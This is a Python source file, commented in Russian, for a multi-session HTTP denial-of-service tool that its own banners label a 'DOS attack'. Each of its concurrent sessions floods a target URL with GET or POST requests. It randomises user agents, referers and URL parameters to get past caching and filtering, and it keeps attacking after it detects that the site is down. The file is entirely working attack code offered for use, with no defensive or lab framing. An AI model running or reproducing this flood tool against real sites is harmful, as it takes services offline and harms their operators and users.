import asyncio
import aiohttp
import time
import random
import uuid
import signal
import sys
import logging
from colorama import init, Fore, Style

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Глобальный флаг для shutdown
shutdown_flag = False

def signal_handler(sig, frame):
    """Обработчик сигнала Ctrl+C"""
    global shutdown_flag
    shutdown_flag = True
    print(f"\n{Fore.YELLOW}Получен сигнал остановки...{Style.RESET_ALL}")

# Инициализация colorama для Windows
init(autoreset=True)


def print_info(msg: str, color: str = Fore.GREEN):
    """Вывод цветного сообщения."""
    print(f"{color}{msg}{Style.RESET_ALL}")


def print_header(title: str):
    """Вывод заголовка."""
    print(f"\n{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{title:^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}\n")


# Списки рандомных данных для запросов
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.instagram.com/",
    "https://www.youtube.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/",
    "https://stackoverflow.com/",
    "https://github.com/",
]


def generate_random_headers():
    """Генерация рандомных заголовков для запроса."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "application/json,text/plain,*/*;q=0.8",
            "text/html,application/json,*/*;q=0.8",
        ]),
        "Accept-Language": random.choice(LANGUAGES),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
        "Referer": random.choice(REFERERS),
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }


def generate_url_with_params(base_url: str) -> str:
    """Генерация URL с рандомными параметрами."""
    if "?" in base_url:
        separator = "&"
    else:
        separator = "?"
    
    params = [
        f"t={int(time.time() * 1000)}",
        f"id={random.randint(1000, 999999)}",
        f"uid={uuid.uuid4().hex[:8]}",
        f"r={random.randint(1, 999)}",
    ]
    
    # Добавляем случайные параметры
    if random.random() > 0.5:
        params.append(f"sess={uuid.uuid4().hex}")
    
    return f"{base_url}{separator}{'&'.join(params)}"


def generate_post_data() -> dict:
    """Генерация рандомных данных для POST запроса."""
    return {
        "username": f"user_{random.randint(1000, 9999)}",
        "email": f"test{random.randint(100, 999)}@example.com",
        "timestamp": int(time.time() * 1000),
        "session_id": uuid.uuid4().hex,
        "data": {
            "key1": random.randint(1, 1000),
            "key2": random.choice(["value1", "value2", "value3"]),
            "key3": uuid.uuid4().hex[:8],
        }
    }


async def run_session(
    session_id: int,
    url: str,
    concurrency: int,
    requests_limit: int,
    is_inf: bool,
    use_post: bool,
    use_random_headers: bool,
    use_random_params: bool,
    shared_stats: dict,
    lock: asyncio.Lock,
    progress_event: asyncio.Event
):
    """Запуск одной сессии DOS атаки."""
    global shutdown_flag
    
    connector = aiohttp.TCPConnector(
        limit=concurrency,
        limit_per_host=concurrency,
        force_close=False,
        enable_cleanup_closed=True
    )
    
    async def check_site(session, target_url: str, request_size: int) -> tuple:
        """Проверка доступности сайта с рандомными заголовками."""
        try:
            headers = generate_random_headers() if use_random_headers else {}
            
            if use_post:
                data = generate_post_data()
                async with session.post(target_url, json=data, timeout=aiohttp.ClientTimeout(total=10), headers=headers) as response:
                    await response.read()
                    return response.status, True, request_size + len(str(data))
            else:
                final_url = generate_url_with_params(target_url) if use_random_params else target_url
                async with session.get(final_url, timeout=aiohttp.ClientTimeout(total=10), headers=headers) as response:
                    content = await response.read()
                    return response.status, True, request_size + len(content)
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            return None, False, request_size
    
    async with aiohttp.ClientSession(connector=connector) as session:
        async with lock:
            shared_stats['sessions_started'] += 1
        
        # Размер запроса (заголовки примерно 300-500 байт)
        request_size = 400
        
        try:
            while True:
                # Check for shutdown flag (сигнал Ctrl+C или общий флаг)
                if shutdown_flag or shared_stats.get('shutdown', False):
                    break
                    
                remaining = requests_limit - shared_stats['total'] if requests_limit > 0 else concurrency
                current_batch = min(concurrency, remaining) if requests_limit > 0 else concurrency
                
                if current_batch <= 0:
                    break
                
                batch_start = time.time()
                tasks = [check_site(session, url, request_size) for _ in range(current_batch)]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                batch_errors = 0
                batch_bytes = 0
                
                for result in results:
                    if isinstance(result, Exception):
                        batch_errors += 1
                        batch_bytes += 400  # Заголовки которые были отправлены
                    elif result[0] is None:
                        batch_errors += 1
                        batch_bytes += result[2]  # request_size - заголовки которые были отправлены
                    else:
                        batch_bytes += result[2]
                
                # Track consecutive timeouts (count batches, not requests)
                if batch_errors == current_batch:
                    async with lock:
                        shared_stats['consecutive_timeouts'] += 1
                else:
                    async with lock:
                        shared_stats['consecutive_timeouts'] = 0
                
                async with lock:
                    shared_stats['total'] += current_batch
                    shared_stats['errors'] += batch_errors
                    shared_stats['batches'] += 1
                    shared_stats['bytes_received'] += batch_bytes
                    
                    # Только выводим сообщение, но НЕ останавливаемся
                    if shared_stats['consecutive_timeouts'] >= 5 and not shared_stats.get('site_down_msg_printed', False):
                        shared_stats['site_down'] = True
                        shared_stats['site_down_msg_printed'] = True
                        print(f"\n{Fore.RED}SITE MAY BE DOWN - CONTINUING ATTACK{Style.RESET_ALL}")
                    
                    # Вывод суммарной статистики
                    total = shared_stats['total']
                    errors = shared_stats['errors']
                    elapsed = time.time() - shared_stats['start_time']
                    rps = total / elapsed if elapsed > 0 else 0
                    shared_stats['last_rps'] = rps
                    
                    # Расчёт скорости в Mbps
                    bytes_received = shared_stats['bytes_received']
                    mbps = (bytes_received * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
                    
                    # Отладочная информация (можно убрать после тестирования)
                    if shared_stats['batches'] % 10 == 0:
                        logger.debug(f"Bytes received: {bytes_received}, Elapsed: {elapsed:.1f}s, Mbps: {mbps:.2f}")
                    
                    print(
                        f"{Fore.RED}{total}{Style.RESET_ALL} requests | "
                        f"{Fore.BLUE}{rps:.1f}{Style.RESET_ALL} req/s | "
                        f"{Fore.GREEN}{mbps:.1f}{Style.RESET_ALL} Mbps | "
                        f"{Fore.MAGENTA}Errors: {errors}{Style.RESET_ALL}"
                    )
                
                if not is_inf and requests_limit > 0 and shared_stats['total'] >= requests_limit:
                    break
                    
        except KeyboardInterrupt:
            pass
        
        async with lock:
            shared_stats['sessions_done'] += 1
        
        return shared_stats['total'], shared_stats['errors']


async def multi_main(
    url: str,
    sessions: int = 5,
    concurrency: int = 200,
    requests_limit: int = 0,
    is_inf: bool = False,
    use_post: bool = False,
    use_random_headers: bool = True,
    use_random_params: bool = True,
    show_header: bool = True
):
    """Запуск нескольких параллельных сессий DOS атаки."""
    
    # Преобразуем строку в bool если нужно
    if isinstance(is_inf, str):
        is_inf = is_inf.lower() == 'y'
    
    if show_header:
        print_header("Multi-Session DOS Attack")
    print_info(f"Target: {url}", Fore.BLUE)
    print_info(f"Sessions: {sessions}")
    print_info(f"Concurrency per session: {concurrency}")
    print_info(f"Total potential concurrency: {sessions * concurrency}")
    
    if use_random_headers:
        print_info(f"Random Headers: ENABLED", Fore.GREEN)
    if use_random_params:
        print_info(f"Random URL Params: ENABLED", Fore.GREEN)
    if use_post:
        print_info(f"POST Requests: ENABLED", Fore.GREEN)
    
    if is_inf or requests_limit == 0:
        print_info("Mode: INFINITE (Ctrl+C to stop)", Fore.YELLOW)
    else:
        print_info(f"Mode: LIMITED to {requests_limit} requests per session", Fore.YELLOW)
    
    print_info("Press Ctrl+C to stop\n", Fore.YELLOW)
    
    shared_stats = {
        'total': 0,
        'errors': 0,
        'batches': 0,
        'sessions_done': 0,
        'sessions_started': 0,
        'consecutive_timeouts': 0,
        'last_rps': 0,
        'site_down': False,
        'site_down_msg_printed': False,
        'bytes_received': 0,
        'start_time': time.time()
    }
    lock = asyncio.Lock()
    
    tasks = [
        run_session(
            session_id=i + 1,
            url=url,
            concurrency=concurrency,
            requests_limit=requests_limit,
            is_inf=is_inf,
            use_post=use_post,
            use_random_headers=use_random_headers,
            use_random_params=use_random_params,
            shared_stats=shared_stats,
            lock=lock,
            progress_event=asyncio.Event()
        )
        for i in range(sessions)
    ]
    
    # Запускаем все сессии
    try:
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        logger.info("Получен сигнал остановки пользователем")
    
    # Показываем summary только при остановке (для бесконечного режима)
    if is_inf or requests_limit == 0:
        # Это бесконечный режим - показываем summary
        elapsed = time.time() - shared_stats['start_time']
        last_rps = shared_stats.get('last_rps', 0)
        bytes_received = shared_stats.get('bytes_received', 0)
        
        # Расчёт трафика
        mbps = (bytes_received * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
        total_mb = bytes_received / (1024 * 1024) if bytes_received > 0 else 0
        
        print("\n")
        print_header("=== ATTACK SUMMARY ===")
        print_info(f"Sessions: {shared_stats['sessions_started']}", Fore.CYAN)
        print_info(f"Total Requests: {shared_stats['total']}", Fore.RED)
        print_info(f"Last RPS: {last_rps:.1f}", Fore.BLUE)
        print_info(f"Errors: {shared_stats['errors']}", Fore.YELLOW)
        print_info(f"Total Traffic: {total_mb:.2f} MB", Fore.YELLOW)
        print_info(f"Average Speed: {mbps:.2f} Mbit/s", Fore.GREEN)
        
        if shared_stats.get('site_down', False):
            print_info("SITE STATUS: DOWN (5+ consecutive timeouts)", Fore.RED)
        
        if elapsed > 0:
            avg_rps = shared_stats['total'] / elapsed
            print_info(f"Average RPS: {avg_rps:.1f} req/s", Fore.CYAN)
            print_info(f"Elapsed Time: {elapsed:.1f}s", Fore.CYAN)
    
    return {
        'total': shared_stats['total'],
        'errors': shared_stats['errors'],
        'bytes': bytes_received,
        'elapsed': elapsed,
        'sessions': shared_stats['sessions_started'],
        'site_down': shared_stats.get('site_down', False)
    }


async def main(
    url: str,
    sessions: int = 5,
    concurrency: int = 200,
    requests_limit: int = 0,
    is_inf: bool = False,
    use_post: bool = False,
    use_random_headers: bool = True,
    use_random_params: bool = True,
    show_header: bool = True
):
    """Точка входа."""
    try:
        await multi_main(
            url=url,
            sessions=sessions,
            concurrency=concurrency,
            requests_limit=requests_limit,
            is_inf=is_inf,
            use_post=use_post,
            use_random_headers=use_random_headers,
            use_random_params=use_random_params
        )
    except KeyboardInterrupt:
        print_info("\nInterrupted by user", Fore.YELLOW)


async def use(req_per_con: int, is_inf: str, url: str, session: int, use_post: bool = False, use_random_headers: bool = True, use_random_params: bool = True, show_header: bool = True):
    """Функция для совместимости с main.py."""
    await main(
        url,
        sessions=session,
        concurrency=req_per_con,
        is_inf=is_inf,
        use_post=use_post,
        use_random_headers=use_random_headers,
        use_random_params=use_random_params
    )
